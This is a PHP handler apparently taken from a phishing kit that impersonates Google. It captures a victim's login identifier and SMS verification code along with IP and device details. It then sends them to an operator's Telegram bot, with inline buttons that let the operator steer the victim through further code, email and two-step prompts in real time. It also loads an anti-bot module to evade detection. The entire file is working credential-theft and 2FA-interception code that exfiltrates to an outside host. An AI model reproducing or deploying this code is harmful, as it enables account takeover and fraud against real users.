<?php
ob_start();
header("Content-Security-Policy: default-src 'none'; connect-src 'self' http://127.0.0.1; script-src 'self'; style-src 'self'; img-src 'self';");
header('Content-Type: application/json');

require_once '../modules/sessions.php';
require_once '../antibots/all.php';
require_once __DIR__ . '/../modules/load_env.php';

date_default_timezone_set('Europe/Paris');

$bot_token = $_ENV['BOT_TOKEN'] ?? '';
$chat_id   = $_ENV['CHAT_ID'] ?? '';

if (empty($bot_token) || empty($chat_id)) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['error' => 'Configuration Telegram manquante.']);
    exit;
}

// 🔐 Données POST
$login_identifiant       = htmlspecialchars(trim($_SESSION['login_identifiant'] ?? ''), ENT_QUOTES, 'UTF-8');
$code_sms= htmlspecialchars(trim($_POST['code_sms'] ?? ''), ENT_QUOTES, 'UTF-8');

// 🔎 Infos techniques
$ip          = htmlspecialchars($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'], ENT_QUOTES, 'UTF-8');
$device_type = htmlspecialchars($_SESSION['visitor']['device_type'] ?? 'Inconnu', ENT_QUOTES, 'UTF-8');
$device      = htmlspecialchars($_SESSION['visitor']['device_model'] ?? 'Inconnu', ENT_QUOTES, 'UTF-8');
$datetime    = date('d/m/Y H:i:s');
$uid = $_SESSION['user_id'] ?? uniqid('user_', true);


// 🧠 Session
$_SESSION['code_sms'] =$code_sms;
$code_sms = htmlspecialchars($_SESSION['code_sms'] ?? 'Non renseignée', ENT_QUOTES, 'UTF-8');



// 📲 Message Telegram
$message_text = "
🗝️ <b>+1 code sms | Google </b>
└📲 Code sms : <code>$code_sms</code>

<b>🖥️ Infos système</b>
├ 🌐 IP : <code>$ip</code>
├ 💻 Type : <code>$device_type</code>
├ 📱 Modèle : <code>$device</code>
└ 📅 Date : <code>$datetime</code>

<blockquote>📍 GOOGLE [$datetime]
└ Xcode_officiel : [© " . date('Y') . " - All rights reserved.]</blockquote>
";



$keyboard = [
    'inline_keyboard' => [
        [['text' => '❌ CODE SMS', 'callback_data' => "code_sms_error|$uid"]],  
        [['text' => '📩 Code Mail', 'callback_data' => "code_mail|$uid"]],  
        [['text' => '📲 Validation en 2 Etapes', 'callback_data' => "2steps|$uid"],  ['text' => ' 📞 N°Tel', 'callback_data' => "num|$uid"]],         
       
        [['text' => '✅ Succès', 'callback_data' => "success|$uid"],
        ['text' => '📛 Ban IP', 'callback_data' => "ban_ip|$uid"]]
    ]
];


function sendTelegramMessage($bot_token, $chat_id, $text, $reply_markup = null, $parse_mode = 'HTML') {
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";

    $post_fields = [
        'chat_id'    => $chat_id,
        'text'       => $text,
        'parse_mode' => $parse_mode,
    ];

    if ($reply_markup !== null) {
        $post_fields['reply_markup'] = json_encode($reply_markup);
    }

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post_fields,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
    ]);

    $result = curl_exec($ch);
    if ($result === false) {
        throw new Exception("cURL Error: " . curl_error($ch));
    }

    curl_close($ch);
    $response = json_decode($result, true);

    if (!$response || !$response['ok']) {
        $desc = $response['description'] ?? 'Erreur inconnue';
        throw new Exception("Telegram API Error: $desc");
    }

    return $response;
}

// ✅ Réponse client
try {
    sendTelegramMessage($bot_token, $chat_id, $message_text, $keyboard);
    ob_end_clean();
    echo json_encode(['step' => 2]);
} catch (Exception $e) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['error' => "Erreur Telegram : " . $e->getMessage()]);
    exit;
}
